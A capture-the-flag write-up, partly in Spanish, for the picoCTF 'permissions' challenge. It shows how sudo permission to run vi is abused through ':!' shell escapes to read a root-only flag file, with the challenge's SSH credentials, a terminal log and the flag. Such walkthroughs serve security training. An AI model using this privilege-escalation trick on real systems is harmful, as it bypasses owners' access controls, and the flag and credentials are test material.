# permissions

### Description

Can you read files in the root file?

Additional details will be available after launching your challenge instance.

The system admin has provisioned an account for you on the main server:`ssh -p 65252 picoplayer@saturn.picoctf.net`Password: `UYiOazkqY2`Can you login and read the root file?

### 1 Hints 

* What permissions do you have?

## Solución

Ingresamos nuestra dirección ssh proporcionada, ponemos la contraseña y una vez dado los permisos, vemos el contenido con un ls, después intentamos ver el contenido de la carpeta root, pero con un `sudo -l` veremos los comandos que se pueden ejecutar, enseguida escribimos vi y abre un editor en el cual y para ejecutar los comandos se escribe `:! ls /root` después de da enter y se escribe `vi` y se ejecuta un superusuario en el cual se puede examinar el directorio raíz, se da un `:! ls -al /root` para mostrar los archivos ocultos y una vez ejecutado podemos observar como hay un archivo `flag.txt` así que por ultimo aplicamos un cat para que nos muestre el contenido `:! cat /root/.flag.txt` y con esto nos muestra nuestra flag:

```
jazmin@DESKTOP-1CBQJ6D:~/FIS$ ssh -p 65252 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:65252 ([13.59.203.175]:65252)' can't be established.
ECDSA key fingerprint is SHA256:s2AWZ4eSekFqmKTQL464AhEMZ0l1HLfG7L6emApGl5c.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:65252,[13.59.203.175]:65252' (ECDSA) to the list of known hosts.
picoplayer@saturn.picoctf.net's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ ls /
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
picoplayer@challenge:~$ ls /root
ls: cannot open directory '/root': Permission denied
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ vi

ls: cannot open directory '/root': Permission denied

shell returned 2

Press ENTER or type command to continue
[1]+  Stopped                 vi
picoplayer@challenge:~$ sudo vi


Press ENTER or type command to continue
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 21 06:21 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile

Press ENTER or type command to continue
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}

Press ENTER or type command to continueConnection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
jazmin@DESKTOP-1CBQJ6D:~/FIS$
```

### Resultado: picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}